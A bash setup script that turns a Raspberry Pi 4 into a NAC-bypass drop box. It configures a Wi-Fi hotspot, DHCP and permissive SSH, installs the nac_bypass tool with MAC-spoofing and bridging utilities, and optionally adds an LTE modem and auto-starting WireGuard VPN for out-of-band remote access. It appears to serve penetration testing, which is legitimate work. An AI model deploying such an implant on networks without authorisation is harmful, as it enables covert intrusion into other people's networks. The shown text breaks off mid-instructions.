#!/bin/bash

# This script automates the setup of a Raspberry Pi 4 for NAC bypassing
# based on the guide from https://luemmelsec.github.io/I-got-99-problems-but-my-NAC-aint-one/

# ANSI Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD='\033[1m'

# Emojis
SUCCESS_EMOJI="✅"
ERROR_EMOJI="❌"
WARNING_EMOJI="⚠️"
INFO_EMOJI="ℹ️"
STEP_EMOJI="➡️"

# Function to display error messages and exit
error_exit() {
    echo -e "${ERROR_EMOJI} ${RED}Error: $1${RESET}" >&2
    exit 1
}

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
    error_exit "This script must be run as root. Please use 'sudo'."
fi

echo -e "${BOLD}${CYAN}Welcome to the Raspberry Pi Hotspot, DHCP, NAC Bypass, LTE, and VPN Setup Script!${RESET}"
echo -e "${CYAN}----------------------------------------------------------------------------------${RESET}"

# --- User Input for Hotspot Details ---
echo -e "${INFO_EMOJI} ${BLUE}Please provide details for your Wi-Fi Hotspot:${RESET}"
read -p "Enter the desired Wi-Fi Hotspot Name (SSID): " WIFI_SSID
if [ -z "$WIFI_SSID" ]; then
    error_exit "Wi-Fi SSID cannot be empty."
fi

read -s -p "Enter the desired Wi-Fi Password (WPA-PSK, min 8 characters): " WIFI_PASSWORD
echo
if [ -z "$WIFI_PASSWORD" ] || [ ${#WIFI_PASSWORD} -lt 8 ]; then
    error_exit "Wi-Fi Password cannot be empty and must be at least 8 characters long."
fi

# --- User Input for LTE Module Setup Option ---
echo -e "\n${INFO_EMOJI} ${BLUE}Do you want to set up the Huawei LTE connection service? (y/n): ${RESET}"
read -p "Enter 'y' or 'n': " -n 1 -r INSTALL_LTE_MODULE_CHOICE
echo
INSTALL_LTE_MODULE_CHOICE=${INSTALL_LTE_MODULE_CHOICE,,} # Convert to lowercase
if [[ "$INSTALL_LTE_MODULE_CHOICE" == "y" ]]; then
    INSTALL_LTE_MODULE=true
    # --- User Input for LTE Service Username ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Please provide the username for the Huawei LTE connection service:${RESET}"
    read -p "Enter the username (e.g., pi, yourusername): " LTE_USERNAME
    if [ -z "$LTE_USERNAME" ]; then
        error_exit "LTE service username cannot be empty."
    fi
    if ! id "$LTE_USERNAME" &>/dev/null; then
        error_exit "User '$LTE_USERNAME' does not exist. Please create the user or provide an existing one."
    fi

    # --- User Input for Huawei LTE Password and SIM PIN ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Please provide details for your Huawei LTE Modem:${RESET}"
    read -s -p "Enter the Huawei LTE Modem Password (leave empty for default): " HUAWEI_MODEM_PASSWORD
    echo
    read -p "Enter the SIM Card PIN (required for connection): " SIM_PIN
    if [ -z "$SIM_PIN" ]; then
        error_exit "SIM Card PIN cannot be empty if setting up LTE."
    fi

    # --- User Input for WireGuard VPN Setup Option ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Do you want to set up an automatic WireGuard VPN connection? (y/n): ${RESET}"
    read -p "Enter 'y' or 'n': " -n 1 -r INSTALL_WIREGUARD_CHOICE
    echo
    INSTALL_WIREGUARD_CHOICE=${INSTALL_WIREGUARD_CHOICE,,} # Convert to lowercase
    if [[ "$INSTALL_WIREGUARD_CHOICE" == "y" ]]; then
        INSTALL_WIREGUARD=true
        echo -e "\n${INFO_EMOJI} ${BLUE}Please ensure your WireGuard configuration file is named 'wg0.conf' and placed in '/etc/wireguard/'.${RESET}"
        read -p "Press Enter to continue once 'wg0.conf' is in place, or 'q' to quit: " CONFIRM_WG
        if [[ "$CONFIRM_WG" == "q" ]]; then
            error_exit "WireGuard setup aborted by user."
        fi
        if [ ! -f "/etc/wireguard/wg0.conf" ]; then
            error_exit "WireGuard config file /etc/wireguard/wg0.conf not found. Please create it first."
        fi
        echo -e "${SUCCESS_EMOJI} ${GREEN}WireGuard configuration file detected.${RESET}"
    else
        INSTALL_WIREGUARD=false
        echo -e "${INFO_EMOJI} ${BLUE}Skipping WireGuard VPN connection setup.${RESET}"
    fi

else
    INSTALL_LTE_MODULE=false
    INSTALL_WIREGUARD=false # If no LTE, no WireGuard
    echo -e "${INFO_EMOJI} ${BLUE}Skipping Huawei LTE connection service setup and WireGuard VPN setup.${RESET}"
fi


echo -e "\n${BOLD}${CYAN}--- Starting installation and configuration ---${RESET}\n"

# --- Step 1: Install required packages for Hotspot/DHCP ---
echo -e "${STEP_EMOJI} ${BLUE}1. Installing isc-dhcp-server and hostapd...${RESET}"
apt-get update || error_exit "Failed to update package lists."
apt-get install -y isc-dhcp-server hostapd || error_exit "Failed to install required packages."
echo -e "${SUCCESS_EMOJI} ${GREEN}isc-dhcp-server and hostapd installed.${RESET}\n"

# --- Step 2: Enable and unmask services ---
echo -e "${STEP_EMOJI} ${BLUE}2. Enabling and unmasking services...${RESET}"
systemctl enable isc-dhcp-server || error_exit "Failed to enable isc-dhcp-server."
systemctl unmask hostapd || error_exit "Failed to unmask hostapd."
systemctl enable hostapd || error_exit "Failed to enable hostapd."
echo -e "${SUCCESS_EMOJI} ${GREEN}Services enabled and unmasked.${RESET}\n"

# --- Step 3: Configure DHCP Server (dhcpd.conf) ---
echo -e "${STEP_EMOJI} ${BLUE}3. Configuring /etc/dhcp/dhcpd.conf...${RESET}"
DHCPD_CONF="/etc/dhcp/dhcpd.conf"
cat <<EOL > "$DHCPD_CONF"
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.200.0 netmask 255.255.255.0 {
range 192.168.200.2 192.168.200.100;
option subnet-mask 255.255.255.0;
option broadcast-address 192.168.200.255;
}
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $DHCPD_CONF."; fi
echo -e "${SUCCESS_EMOJI} ${GREEN}$DHCPD_CONF configured.${RESET}\n"

# --- Step 4: Configure Hostapd (hostapd.conf) ---
echo -e "${STEP_EMOJI} ${BLUE}4. Configuring /etc/hostapd/hostapd.conf...${RESET}"
HOSTAPD_CONF="/etc/hostapd/hostapd.conf"

# Warning: Remove existing wlan0 configurations if they exist
echo -e "    ${INFO_EMOJI} ${BLUE}Checking for existing wlan0 network configurations...${RESET}"
if [ -f "/etc/netplan/50-cloud-init.yaml" ]; then
    echo -e "    ${WARNING_EMOJI} ${YELLOW}Removing /etc/netplan/50-cloud-init.yaml...${RESET}"
    rm /etc/netplan/50-cloud-init.yaml || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to remove /etc/netplan/50-cloud-init.yaml. Manual intervention might be needed.${RESET}"
fi
echo -e "    ${INFO_EMOJI} ${BLUE}If you have configured wlan0 manually or via Raspberry Pi Imager, you might need to remove it via 'nmtui'.${RESET}"


cat <<EOL > "$HOSTAPD_CONF"
interface=wlan0
#driver=nl80211
ssid=${WIFI_SSID}
hw_mode=g
channel=1
ieee80211n=1
ieee80211d=1
country_code=DE
#wme_enabled=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
macaddr_acl=0
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=${WIFI_PASSWORD}
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $HOSTAPD_CONF."; fi
echo -e "${SUCCESS_EMOJI} ${GREEN}$HOSTAPD_CONF configured with provided SSID and password.${RESET}\n"

# --- Step 5: Validate interface name in isc-dhcp-server default file ---
echo -e "${STEP_EMOJI} ${BLUE}5. Configuring /etc/default/isc-dhcp-server...${RESET}"
DEFAULT_DHCP_SERVER="/etc/default/isc-dhcp-server"
sed -i 's/^INTERFACESv4=.*$/INTERFACESv4="wlan0"/' "$DEFAULT_DHCP_SERVER"
if ! grep -q 'INTERFACESv4="wlan0"' "$DEFAULT_DHCP_SERVER"; then
    echo 'INTERFACESv4="wlan0"' >> "$DEFAULT_DHCP_SERVER"
fi
if [ $? -ne 0 ]; then error_exit "Failed to configure $DEFAULT_DHCP_SERVER."; fi
echo -e "${SUCCESS_EMOJI} ${GREEN}$DEFAULT_DHCP_SERVER configured for wlan0.${RESET}\n"

# --- Step 6: Create/Update systemd service for isc-dhcp-server ---
echo -e "${STEP_EMOJI} ${BLUE}6. Creating/Updating /etc/systemd/system/isc-dhcp-server.service...${RESET}"
SYSTEMD_DHCP_SERVICE="/etc/systemd/system/isc-dhcp-server.service"
cat <<EOL > "$SYSTEMD_DHCP_SERVICE"
[Unit]
Description=ISC DHCP Server
After=network-pre.target
Wants=network-pre.target
Requires=network-pre.target
Requires=sys-subsystem-net-devices-wlan0.device
After=sys-subsystem-net-devices-wlan0.device
After=hostapd.service

[Service]
ExecStart=/etc/init.d/isc-dhcp-server start
ExecStop=/etc/init.d/isc-dhcp-server stop
Type=forking
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $SYSTEMD_DHCP_SERVICE."; fi
echo -e "${SUCCESS_EMOJI} ${GREEN}$SYSTEMD_DHCP_SERVICE created/updated.${RESET}\n"

# --- Step 7: Configure wlan0 static IP with systemd-networkd ---
echo -e "${STEP_EMOJI} ${BLUE}7. Configuring wlan0 static IP with systemd-networkd...${RESET}"
SYSTEMD_NETWORK_DIR="/etc/systemd/network"
mkdir -p "$SYSTEMD_NETWORK_DIR" || error_exit "Failed to create $SYSTEMD_NETWORK_DIR."
NETWORK_CONF="$SYSTEMD_NETWORK_DIR/10-wlan0-static.network"

cat <<EOL > "$NETWORK_CONF"
[Match]
Name=wlan0

[Network]
Address=192.168.200.1/24
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $NETWORK_CONF."; fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}$NETWORK_CONF created.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}Enabling and restarting systemd-networkd...${RESET}"
systemctl enable systemd-networkd || error_exit "Failed to enable systemd-networkd."
systemctl restart systemd-networkd || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to restart systemd-networkd. Check logs or reboot.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}systemd-networkd enabled and restart attempted.${RESET}\n"

# --- Step 7.1: Configure eth1 for DHCP using /etc/network/interfaces.d/ ---
echo -e "${STEP_EMOJI} ${BLUE}7.1. Configuring eth1 for DHCP using /etc/network/interfaces.d/...${RESET}"
INTERFACES_D_DIR="/etc/network/interfaces.d"
mkdir -p "$INTERFACES_D_DIR" || error_exit "Failed to create $INTERFACES_D_DIR."
ETH1_CONF="$INTERFACES_D_DIR/eth1"

cat <<EOL > "$ETH1_CONF"
auto eth1
    allow-hotplug eth1
    iface eth1 inet dhcp
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $ETH1_CONF."; fi
echo -e "     ${SUCCESS_EMOJI} ${GREEN}$ETH1_CONF created for DHCP.${RESET}"
echo -e "     ${WARNING_EMOJI} ${YELLOW}Note: You are configuring 'eth1' using '/etc/network/interfaces.d/' while 'wlan0' is managed by 'systemd-networkd'. This is a hybrid setup and requires a reboot to take full effect for 'eth1'. Ensure NetworkManager is disabled to avoid conflicts.${RESET}\n"

# --- Step 7.2: Configure eth0 for hotplug (no IP) using /etc/network/interfaces.d/ ---
echo -e "${STEP_EMOJI} ${BLUE}7.2. Configuring eth0 for hotplug (no IP assigned) using /etc/network/interfaces.d/...${RESET}"
ETH0_CONF="$INTERFACES_D_DIR/eth0"

cat <<EOL > "$ETH0_CONF"
auto eth0
    allow-hotplug eth0
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $ETH0_CONF."; fi
echo -e "     ${SUCCESS_EMOJI} ${GREEN}$ETH0_CONF created for hotplug, no IP assigned.${RESET}\n"

# --- Step 8: Reload systemd, enable, and restart services ---
# Adjusted numbering from previous step
echo -e "${STEP_EMOJI} ${BLUE}8. Reloading systemd daemon, enabling and restarting services...${RESET}"
# Remove systemd-networkd-wait-online override here, in case it was applied previously
# This is relevant because we're moving to a more specific internet connectivity check.
if [ -f "/etc/systemd/system/systemd-networkd-wait-online.service.d/override.conf" ]; then
    echo -e "    ${INFO_EMOJI} ${BLUE}Removing previous systemd-networkd-wait-online override...${RESET}"
    rm /etc/systemd/system/systemd-networkd-wait-online.service.d/override.conf
    rmdir /etc/systemd/system/systemd-networkd-wait-online.service.d/ 2>/dev/null # Remove dir if empty
    systemctl daemon-reload # Reload after removal
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}systemd-networkd-wait-online override removed.${RESET}"
fi

systemctl daemon-reload || error_exit "Failed to reload systemd daemon."
# Hostapd and isc-dhcp-server restart handled here as well, although already attempted.
# This ensures they pick up the wlan0 configuration.
systemctl restart hostapd || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to restart hostapd. Check logs after reboot.${RESET}"
systemctl restart isc-dhcp-server || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to restart isc-dhcp-server. Check logs after reboot.${RESET}"
# Disable network manager as it mangles with hostapd and causes IEEE 802.11: disassociated
sudo systemctl disable NetworkManager || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to disable NetworkManager. Check logs after reboot.${RESET}"
echo -e "${SUCCESS_EMOJI} ${GREEN}Services reloaded and restarted (if possible).${RESET}\n"


# --- Step 9: Configure SSH properly (overwriting) ---
echo -e "${STEP_EMOJI} ${BLUE}9. Configuring /etc/ssh/sshd_config (overwriting existing file)...${RESET}"
SSHD_CONF="/etc/ssh/sshd_config"

# Backup original sshd_config
cp "$SSHD_CONF" "${SSHD_CONF}.bak_$(date +%Y%m%d%H%M%S)"
echo -e "    ${INFO_EMOJI} ${BLUE}Backup of $SSHD_CONF created at ${SSHD_CONF}.bak_$(date +%Y%m%d%H%M%S)${RESET}"

cat <<'EOF' > "$SSHD_CONF"
Protocol 2
AddressFamily any
Port 22
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

# SSH Authentication
UsePAM yes
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
#PermitRootLogin no
HostbasedAuthentication no
ChallengeResponseAuthentication no
KerberosAuthentication no
GSSAPIAuthentication no
IgnoreRhosts yes

# SSH Authorized Keyfiles
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2

# SSH Session
TCPKeepAlive yes
ClientAliveInterval 600
ClientAliveCountMax 2
LoginGraceTime 60
MaxAuthTries 3
Compression no

# SSH Information Disclosure
DebianBanner no
PrintMotd no
PrintLastLog yes

# SSH Logging
LogLevel VERBOSE
SyslogFacility AUTH

# SSH Tunneling & Forwarding
AllowAgentForwarding no
AllowTcpForwarding yes
PermitTunnel yes
X11Forwarding no
PermitUserEnvironment no

# SSH File Mode & Ownership Checking
StrictModes yes
#UsePrivilegeSeparation yes # deprecated

# SSH Encryption Ciphers
# recommended from https://www.sshaudit.com/hardening_guides.html#ubuntu_20_04_lts
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes256-ctr,aes192-ctr

# SSH Message Authentication Codes (MAC)
# recommended from https://www.sshaudit.com/hardening_guides.html#ubuntu_20_04_lts
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com

# SSH Host Key Algorithms
# recommended from https://www.sshaudit.com/hardening_guides.html#ubuntu_20_04_lts
HostKeyAlgorithms ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,sk-ssh-ed25519@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-512,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512-cert-v01@openssh.com

# SSH Key Exchange Algorithms
# recommended from https://www.sshaudit.com/hardening_guides.html#ubuntu_20_04_lts
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512

# Allow older public key types
#PubkeyAcceptedKeyTypes=+ssh-rsa

# SSH Custom Network Configuration (remove after setup)
Match Address 192.168.0.0/16,10.0.0.0/8,172.16.0.0/12
    PasswordAuthentication yes

# SSH Custom Network Configuration (hotspot or vpn)
Match Address 192.168.200.0/24,100.64.0.0/10
    PasswordAuthentication yes    
EOF
if [ $? -ne 0 ]; then error_exit "Failed to write $SSHD_CONF."; fi
echo -e "${SUCCESS_EMOJI} ${GREEN}$SSHD_CONF overwritten successfully.${RESET}\n"

echo -e "${STEP_EMOJI} ${BLUE}10. Restarting SSH service to apply changes...${RESET}"
systemctl restart ssh.service || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to restart SSH service. Check for errors.${RESET}"
echo -e "${SUCCESS_EMOJI} ${GREEN}SSH service restart attempted.${RESET}\n"

# --- Step 11: Install and configure nac_bypass ---
echo -e "${STEP_EMOJI} ${BLUE}11. Installing and configuring nac_bypass tool...${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.1. Installing nac_bypass dependencies...${RESET}"
apt-get install -y bridge-utils ethtool macchanger arptables ebtables iptables net-tools tcpdump git || error_exit "Failed to install nac_bypass dependencies."
echo -e "    ${SUCCESS_EMOJI} ${GREEN}nac_bypass dependencies installed.${RESET}"

echo -e "    ${STEP_EMOJI} ${BLUE}11.2. Ensuring legacy iptables, arptables, and ebtables are used...${RESET}"
update-alternatives --set iptables /usr/sbin/iptables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set iptables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set ip6tables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set arptables /usr/sbin/arptables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set arptables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set ebtables /usr/sbin/ebtables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set ebtables to legacy. Manual intervention may be needed.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Legacy netfilter tools configured.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.3. Loading kernel module br_netfilter...${RESET}"
modprobe br_netfilter
if ! lsmod | grep -q br_netfilter; then
    echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: br_netfilter module not loaded. Manual intervention may be needed.${RESET}"
else
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}br_netfilter module loaded.${RESET}"
fi

echo -e "    ${INFO_EMOJI} ${BLUE}11.4. Appending br_netfilter to /etc/modules...${RESET}"
if ! grep -q "br_netfilter" /etc/modules; then
    echo "br_netfilter" | tee -a /etc/modules || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to append br_netfilter to /etc/modules.${RESET}"
else
    echo -e "    ${INFO_EMOJI} ${BLUE}br_netfilter already in /etc/modules.${RESET}"
fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}br_netfilter configuration complete.${RESET}"

# --- Added Step: Add root cronjob to ensure br_netfilter module is loaded ---
echo -e "    ${STEP_EMOJI} ${BLUE}11.5. Adding root cronjob to ensure br_netfilter module is loaded on reboot...${RESET}"
(crontab -l -u root 2>/dev/null | grep -v 'modprobe br_netfilter' ; echo "@reboot /sbin/modprobe br_netfilter") | crontab -u root -
if [ $? -ne 0 ]; then error_exit "Failed to add root cronjob for br_netfilter."; fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Root cronjob for br_netfilter added.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.6. Enabling IP forwarding in /etc/sysctl.conf...${RESET}"
SYSCTL_CONF="/etc/sysctl.conf"
if ! grep -q "^net.ipv4.ip_forward = 1" "$SYSCTL_CONF"; then
    echo "net.ipv4.ip_forward = 1" >> "$SYSCTL_CONF"
    echo -e "    ${INFO_EMOJI} ${BLUE}net.ipv4.ip_forward = 1 added to $SYSCTL_CONF.${RESET}"
else
    sed -i 's/^#net.ipv4.ip_forward = 1/net.ipv4.ip_forward = 1/' "$SYSCTL_CONF"
    echo -e "    ${INFO_EMOJI} ${BLUE}net.ipv4.ip_forward = 1 uncommented or ensured in $SYSCTL_CONF.${RESET}"
fi
sysctl -p || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to apply sysctl changes immediately. Reboot will apply.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}IP forwarding enabled.${RESET}"


echo -e "    ${INFO_EMOJI} ${BLUE}11.7. Cloning nac_bypass repository...${RESET}"
NAC_BYPASS_DIR="$HOME/nac_bypass"
if [ -d "$NAC_BYPASS_DIR" ]; then
    echo -e "    ${INFO_EMOJI} ${BLUE}$NAC_BYPASS_DIR already exists. Pulling latest changes...${RESET}"
    (cd "$NAC_BYPASS_DIR" && git pull) || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to pull latest changes for nac_bypass.${RESET}"
else
    git clone https://github.com/scipag/nac_bypass "$NAC_BYPASS_DIR" || error_exit "Failed to clone nac_bypass repository."
fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}nac_bypass repository cloned/updated.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.8. Setting permissions for nac_bypass_setup.sh...${RESET}"
chmod +x "$NAC_BYPASS_DIR/nac_bypass_setup.sh" || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set executable permissions for nac_bypass_setup.sh.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Permissions set for nac_bypass_setup.sh.${RESET}\n"

# --- Step 12: Install and configure Huawei LTE Connect Service (Optional) ---
if [ "$INSTALL_LTE_MODULE" = true ]; then
    echo -e "${STEP_EMOJI} ${BLUE}12. Installing and configuring Huawei LTE Connect Service...${RESET}"

    HUAWEI_HILINK_DIR="/home/$LTE_USERNAME/huawei_hilink_api" # Use provided username for home directory

    echo -e "    ${INFO_EMOJI} ${BLUE}12.1. Cloning huawei_hilink_api repository...${RESET}"
    if [ -d "$HUAWEI_HILINK_DIR" ]; then
        echo -e "    ${INFO_EMOJI} ${BLUE}$HUAWEI_HILINK_DIR already exists. Pulling latest changes...${RESET}"
        (cd "$HUAWEI_HILINK_DIR" && git pull) || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to pull latest changes for huawei_hilink_api.${RESET}"
    else
        # Ensure the parent directory exists before cloning
        mkdir -p "/home/$LTE_USERNAME" || error_exit "Failed to create /home/$LTE_USERNAME directory."
        git clone https://github.com/zbchristian/huawei_hilink_api "$HUAWEI_HILINK_DIR" || error_exit "Failed to clone huawei_hilink_api repository."
        chown -R "$LTE_USERNAME":"$LTE_USERNAME" "$HUAWEI_HILINK_DIR" # Set ownership
    fi
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}huawei_hilink_api repository cloned/updated.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.2. Configuring example_huawei_hilink.sh with provided credentials and absolute path...${RESET}"
    EXAMPLE_SCRIPT="$HUAWEI_HILINK_DIR/example_huawei_hilink.sh"
    if [ ! -f "$EXAMPLE_SCRIPT" ]; then
        error_exit "example_huawei_hilink.sh not found in $HUAWEI_HILINK_DIR."
    fi

    # Escape password and PIN for sed
    ESCAPED_HUAWEI_MODEM_PASSWORD=$(printf '%s\n' "$HUAWEI_MODEM_PASSWORD" | sed -e 's/[\/&]/\\&/g')
    ESCAPED_SIM_PIN=$(printf '%s\n' "$SIM_PIN" | sed -e 's/[\/&]/\\&/g')

    # Replace hilink_password and hilink_pin in the script
    sed -i "s/^hilink_password=\"1234Secret\"/hilink_password=\"$ESCAPED_HUAWEI_MODEM_PASSWORD\"/" "$EXAMPLE_SCRIPT" || error_exit "Failed to set hilink_password in example_huawei_hilink.sh."
    sed -i "s/^hilink_pin=\"1234\"/hilink_pin=\"$ESCAPED_SIM_PIN\"/" "$EXAMPLE_SCRIPT" || error_exit "Failed to set hilink_pin in example_huawei_hilink.sh."

    # Replace the relative source path with the absolute path
    sed -i "s|^source huawei_hilink_api.sh|source $HUAWEI_HILINK_DIR/huawei_hilink_api.sh|" "$EXAMPLE_SCRIPT" || error_exit "Failed to set absolute source path in example_huawei_hilink.sh."

    # Ensure the script is executable
    chmod +x "$EXAMPLE_SCRIPT" || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set executable permissions for $EXAMPLE_SCRIPT.${RESET}"
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}example_huawei_hilink.sh configured.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.3. Creating systemd service for Huawei LTE connection...${RESET}"
    LTE_SERVICE_FILE="/etc/systemd/system/huawei-lte-connect.service"
    cat <<EOL > "$LTE_SERVICE_FILE"
[Unit]
Description=Start Huawei LTE connection
After=network.target

[Service]
Type=oneshot
ExecStartPre=/bin/sleep 60
ExecStart=/bin/bash /home/${LTE_USERNAME}/huawei_hilink_api/example_huawei_hilink.sh on
ExecStop=/bin/bash /home/${LTE_USERNAME}/huawei_hilink_api/example_huawei_hilink.sh off
User=${LTE_USERNAME}
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOL
    if [ $? -ne 0 ]; then error_exit "Failed to write $LTE_SERVICE_FILE."; fi
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}$LTE_SERVICE_FILE created.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.4. Reloading systemd daemon and enabling Huawei LTE service...${RESET}"
    systemctl daemon-reexec || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to re-execute systemd daemon. Reboot recommended.${RESET}"
    systemctl daemon-reload || error_exit "Failed to reload systemd daemon."
    systemctl enable huawei-lte-connect.service || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to enable huawei-lte-connect.service. Check logs after reboot.${RESET}"
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}Huawei LTE service enabled.${RESET}\n"

    # --- Step 13: Install and Configure WireGuard VPN (Optional) ---
    if [ "$INSTALL_WIREGUARD" = true ]; then
        echo -e "${STEP_EMOJI} ${BLUE}13. Installing and configuring WireGuard VPN...${RESET}"

        echo -e "    ${INFO_EMOJI} ${BLUE}13.1. Installing WireGuard package...${RESET}"
        apt-get install -y wireguard || error_exit "Failed to install wireguard."
        echo -e "    ${SUCCESS_EMOJI} ${GREEN}WireGuard installed.${RESET}"

        echo -e "    ${INFO_EMOJI} ${BLUE}13.2. Creating systemd drop-in for wg-quick@wg0.service for internet connectivity check...${RESET}"
        WG_DROPIN_DIR="/etc/systemd/system/wg-quick@wg0.service.d"
        WG_DROPIN_FILE="$WG_DROPIN_DIR/wait-for-internet.conf"
        mkdir -p "$WG_DROPIN_DIR" || error_exit "Failed to create WireGuard drop-in directory."

        cat <<'EOL' > "$WG_DROPIN_FILE"
[Unit]
# Ensure WireGuard starts AFTER the LTE connection service has initiated
After=huawei-lte-connect.service
Requires=huawei-lte-connect.service

[Service]
# This ExecStartPre command will run BEFORE wg-quick up wg0
# It continuously pings a reliable public IP via eth2 until successful,
# indicating actual internet connectivity through the LTE modem.
ExecStartPre=/bin/bash -c 'echo "Waiting for internet connectivity on eth2 for WireGuard..."; while ! ping -c 1 -I eth2 -W 3 8.8.8.8 > /dev/null 2>&1; do echo "eth2 not connected to internet, retrying in 5s..."; sleep 5; done; echo "eth2 is online, starting WireGuard."'
EOL
        if [ $? -ne 0 ]; then error_exit "Failed to write $WG_DROPIN_FILE."; fi
        echo -e "    ${SUCCESS_EMOJI} ${GREEN}$WG_DROPIN_FILE created.${RESET}"

        echo -e "    ${INFO_EMOJI} ${BLUE}13.3. Reloading systemd daemon and enabling wg-quick@wg0.service...${RESET}"
        systemctl daemon-reload || error_exit "Failed to reload systemd daemon."
        systemctl enable wg-quick@wg0.service || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to enable wg-quick@wg0.service. Check logs after reboot.${RESET}"
        echo -e "    ${SUCCESS_EMOJI} ${GREEN}wg-quick@wg0.service enabled.${RESET}\n"
    else
        echo -e "${INFO_EMOJI} ${BLUE}Skipping WireGuard VPN setup as requested. Step 14 omitted.${RESET}\n"
    fi # End of WireGuard setup conditional block

else
    echo -e "${INFO_EMOJI} ${BLUE}Skipping LTE module setup and WireGuard VPN setup as requested. Steps 13 & 14 omitted.${RESET}\n"
fi # End of LTE module setup conditional block


echo -e "${BOLD}${GREEN}----------------------------------------------------------------${RESET}"
echo -e "${BOLD}${GREEN}Setup complete!${RESET}"
echo -e "${BOLD}${GREEN}----------------------------------------------------------------${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}Please reboot your Raspberry Pi for all changes to take full effect.${RESET}"
echo -e "The Wi-Fi hotspot '${BOLD}${WIFI_SSID}${RESET}${BLUE}' with password '${BOLD}${WIFI_PASSWORD}${RESET}${BLUE}' should be available after reboot.${RESET}"
echo -e "You can connect to it and devices should get IPs from 192.168.200.2-100.${RESET}"
echo -e "SSH access from 192.168.200.0/24 will allow password authentication, otherwise pubkey auth is required.${RESET}\n"

echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
echo -e "${BOLD}${CYAN}NAC Bypass Tool Information:${RESET}"
echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}The 'nac_bypass' tool has been installed in: ${BOLD}$NAC_BYPASS_DIR${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}To use it, follow these steps after reboot and connecting the devices:${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}1. Connect the switch to eth0 (native LAN interface of RPi4).${RESET}"
